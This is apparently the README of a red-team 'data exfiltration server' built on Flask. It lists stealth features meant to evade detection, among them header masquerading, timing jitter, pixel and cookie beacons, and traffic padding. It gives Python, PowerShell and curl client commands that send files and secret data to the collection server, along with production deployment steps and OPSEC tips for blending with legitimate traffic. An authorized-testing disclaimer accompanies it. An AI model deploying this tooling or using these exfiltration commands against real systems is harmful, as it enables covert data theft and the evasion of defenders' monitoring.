# 🛡️ Data Exfiltration Server

[![Python](https://img.shields.io/badge/Python-3.7%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.0%2B-green?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
[![Security](https://img.shields.io/badge/Security-Red%20Team-red?style=for-the-badge&logo=shield&logoColor=white)](https://github.com/yourusername/exfil-server)

> **⚠️ DISCLAIMER**: This tool is designed for authorized penetration testing and red team exercises only. Use responsibly and only on systems you own or have explicit permission to test.

A sophisticated, production-ready data exfiltration server built with Flask. Designed for red team operations with advanced stealth features, flexible deployment options, and comprehensive OPSEC controls.

## ✨ Features

### 🔒 Core Functionality
- **Secure File Uploads** - Timestamped + UUID naming scheme
- **Multi-Format Data Capture** - JSON, raw text, and binary support
- **RESTful API** - Clean endpoints for all operations
- **Comprehensive Logging** - Structured logs with rotation support
- **Bearer Token Authentication** - Optional but recommended security layer

### 🥷 Stealth & OPSEC
- **Header Masquerading** - Configurable server headers (default: nginx)
- **Response Timing Jitter** - Randomized delays to avoid detection
- **Silent Mode** - 204 No Content responses for uploads
- **Custom Paths** - Configurable endpoint routing
- **TLS Support** - HTTPS with custom certificates
- **Rate Limiting** - Per-IP/token request throttling

### 🎯 Advanced Features
- **GET Pixel Exfiltration** - 1x1 GIF beacon with data in query params
- **Cookie-based Exfil** - Steganographic data hiding in cookies
- **Host/Referer Filtering** - Allowlist-based request validation
- **Active Hours Control** - Time-based operational windows
- **Response Padding** - Variable packet sizes for traffic analysis evasion
- **Chunked Data Reassembly** - Large payload splitting and reconstruction

## 🚀 Quick Start

### Prerequisites
```bash
# Python 3.7+
pip install flask
```

### Basic Setup
```bash
# 1. Clone the repository
git clone https://github.com/yourusername/exfil-server.git
cd exfil-server

# 2. Set environment variables (optional)
export EXFIL_TOKEN="your-secure-token-here"
export MAX_CONTENT_LENGTH_MB=50

# 3. Run the server
python server/app.py
```

The server will start on `0.0.0.0:8080` and create the necessary directories automatically.

## 📁 Project Structure

```
exfil-server/
├── 📂 server/
│   ├── 🐍 app.py              # Main Flask application
│   ├── 📂 storage/            # Captured files and data
│   └── 📂 logs/               # Server logs
├── 📂 client/
│   ├── 🐍 exfil_client.py     # Python client
│   └── 💙 ps_exfil.ps1        # PowerShell client
├── 📂 deploy/
│   ├── 📂 systemd/            # SystemD service files
│   └── 📂 nginx/              # Nginx configuration
└── 📄 README.md
```

## 🔌 API Endpoints

| Method | Endpoint | Description | Authentication |
|--------|----------|-------------|----------------|
| `GET` | `/` | Health check | ❌ |
| `GET` | `/health` | Detailed status info | ✅ |
| `POST` | `/upload` | File upload | ✅ |
| `POST` | `/exfil` | Data exfiltration | ✅ |
| `GET` | `/files` | List captured files | ✅ |
| `GET` | `/files/<id>` | Download specific file | ✅ |
| `GET` | `/pixel.gif` | GET beacon (if enabled) | ✅ |

## 🛠️ Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `EXFIL_TOKEN` | - | Bearer token for authentication |
| `MAX_CONTENT_LENGTH_MB` | `50` | Maximum upload size in MB |
| `EXFIL_SILENT` | `0` | Return 204 for uploads/exfil |
| `EXFIL_PATH` | - | Alternative exfil endpoint path |
| `EXFIL_SERVER_HEADER` | `nginx` | Server header masquerading |
| `EXFIL_SSL_CERT` | - | Path to SSL certificate |
| `EXFIL_SSL_KEY` | - | Path to SSL private key |

### Advanced OPSEC Controls

<details>
<summary>🔍 Click to expand stealth options</summary>

| Variable | Default | Description |
|----------|---------|-------------|
| `EXFIL_JITTER_MIN_MS` | `0` | Minimum response delay |
| `EXFIL_JITTER_MAX_MS` | `0` | Maximum response delay |
| `EXFIL_GET_ENABLE` | `0` | Enable GET pixel endpoint |
| `EXFIL_GET_PATH` | `/pixel.gif` | GET beacon endpoint |
| `EXFIL_GET_PARAM` | `q` | Query parameter for data |
| `EXFIL_ALLOWED_HOSTS` | - | Comma-separated host allowlist |
| `EXFIL_ALLOWED_REFERERS` | - | Comma-separated referer allowlist |
| `EXFIL_ACTIVE_START` | - | Start hour (0-23) for active window |
| `EXFIL_ACTIVE_END` | - | End hour (0-23) for active window |
| `EXFIL_PAD_MIN` | `0` | Minimum JSON response padding |
| `EXFIL_PAD_MAX` | `0` | Maximum JSON response padding |
| `EXFIL_RATE_WINDOW_SEC` | - | Rate limiting window |
| `EXFIL_RATE_MAX` | - | Max requests per window |
| `EXFIL_DISABLE_HEALTH` | `0` | Disable /health endpoint |
| `EXFIL_DISABLE_FILES` | `0` | Disable /files endpoints |
| `EXFIL_UNAUTH_404` | `0` | Return 404 for unauthorized requests |
| `EXFIL_CHUNK_ENABLE` | `0` | Enable chunked data reassembly |
| `EXFIL_CHUNK_TTL_SEC` | `900` | Chunk reassembly timeout |

</details>

## 💻 Client Examples

### Python Client
```bash
# JSON exfiltration
python client/exfil_client.py https://127.0.0.1:8080 json '{"host":"victim"}' \
  --token "$EXFIL_TOKEN" --insecure

# File upload
python client/exfil_client.py https://127.0.0.1:8080 file /path/to/secret.txt \
  --token "$EXFIL_TOKEN" --insecure

# GET pixel beacon
python client/exfil_client.py https://127.0.0.1:8080 get "beacon-data" \
  --get-path /pixel.gif --token "$EXFIL_TOKEN" --insecure
```

### PowerShell Client
```powershell
# JSON exfiltration
pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode json -Payload '{"x":1}' -Token $env:EXFIL_TOKEN -Insecure

# File upload
pwsh client/ps_exfil.ps1 -Base https://127.0.0.1:8080 -Mode file -Payload C:\path\to\file.txt -Token $env:EXFIL_TOKEN -Insecure
```

### cURL Examples
```bash
# Upload file
curl -H "Authorization: Bearer $EXFIL_TOKEN" \
     -F "file=@/path/to/file" \
     https://localhost:8080/upload

# Exfiltrate JSON data
curl -H "Authorization: Bearer $EXFIL_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"secrets":["data1","data2"]}' \
     https://localhost:8080/exfil

# List captured files
curl -H "Authorization: Bearer $EXFIL_TOKEN" \
     https://localhost:8080/files | jq
```

## 🔐 TLS Setup

Generate self-signed certificates for testing:

```bash
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=localhost"

export EXFIL_SSL_CERT=$(pwd)/cert.pem
export EXFIL_SSL_KEY=$(pwd)/key.pem
```

## 🚀 Production Deployment

### SystemD Service

```bash
# Create service user
sudo useradd --system --home /opt/exfil --shell /usr/sbin/nologin exfil

# Deploy application
sudo rsync -a --delete . /opt/exfil/
sudo chown -R exfil:exfil /opt/exfil

# Install service
sudo cp deploy/systemd/exfil.service /etc/systemd/system/
sudo cp deploy/systemd/exfil.env /etc/default/exfil

# Start service
sudo systemctl daemon-reload
sudo systemctl enable --now exfil

# Monitor logs
journalctl -u exfil -f
```

### Nginx Reverse Proxy

```bash
# Install nginx configuration
sudo cp deploy/nginx/exfil.conf /etc/nginx/sites-available/
sudo ln -s /etc/nginx/sites-available/exfil.conf /etc/nginx/sites-enabled/

# Test and reload
sudo nginx -t && sudo systemctl reload nginx
```

## 🛡️ Security Considerations

- **🔑 Always use strong tokens** in production environments
- **🌐 Deploy behind reverse proxy** for better TLS and header control
- **📊 Monitor traffic patterns** to blend with legitimate usage
- **🕒 Use active hours** to reduce detection during off-peak times
- **🚫 Disable file listing** (`EXFIL_DISABLE_FILES=1`) for higher OPSEC
- **🔄 Rotate tokens regularly** and use unique tokens per operation

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚖️ Legal Notice

This tool is intended for authorized security testing only. Users are responsible for complying with all applicable laws and regulations. The authors assume no liability for misuse of this software.


